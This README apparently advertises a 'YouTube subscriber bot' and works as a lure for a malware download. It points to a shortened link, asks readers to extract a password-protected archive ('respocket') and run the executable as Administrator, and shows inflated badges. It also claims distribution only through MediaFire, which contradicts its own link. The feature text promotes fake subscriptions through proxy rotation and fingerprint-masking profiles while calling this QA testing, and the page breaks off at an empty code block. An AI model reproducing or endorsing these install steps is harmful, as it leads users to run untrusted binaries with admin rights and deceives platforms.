<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# bot subscribers for youtube

Automate safe, human-like subscription workflows on YouTube for testing, QA, and controlled growth experiments. This repo gives you a modular toolkit (CLI + API) to orchestrate multi-profile sessions, proxies, and action pacing.

<p align="center"> 
## Introduction
**youtube sub bot** is a browser-automation toolkit for YouTube subscription flows. Built for growth teams, SDET/QA engineers, and researchers who need reproducible, rate-limited, multi-profile actions with logs and an optional REST API. It focuses on stability, observability, and safety controls—not spammy blast behavior.

**Key Benefits**
- **Time-saving:** one command to spin up N sessions with rotating profiles & proxies.  
- **Scalable:** run headless workers horizontally via Docker or PM2.  
- **Safer:** randomized human-like delays, jitter, per-account caps, and error backoff.

## Features
- Headless/headed runs via **Playwright** (Node) or **Selenium** (Python) adapters.  
- Profile management (local JSON, GoLogin/AdsPower adapters, or basic cookies).  
- Proxy rotation + geo rules; per-run concurrency limits with queue.  
- Action pacing (randomized wait, scroll, dwell) to mimic human behavior.  
- CLI + lightweight REST API server for programmatic control.  
- Structured logs (JSON), run summaries, and retry/backoff policies.  
- .env-driven config with per-profile overrides.

<p align="center">
  <img src="youtube-sub-bot.png" alt="youtube-bot hero" width="80%" hight="70%">
</p>


<p align="center">
## Use Cases
- QA testing of subscription UX across geos and device fingerprints.  
- Controlled growth experiments with compliance-friendly rate limits.  
- Internal tooling to verify channel discovery and funnel steps.  
- Lab/demo environments to showcase automation orchestration patterns.

## Contact
<p align="center">
## Installation Instructions

### Pre-requisites
- **Node.js** ≥ 18 and **npm** or **pnpm**
- **Python** ≥ 3.10 (optional Python worker)
- **Docker** (optional, for containerized runs)
- **Git**
- (Optional) **GoLogin/AdsPower** if using external profile managers
- Proxies (HTTP/SOCKS) if required

### Clone
```bash
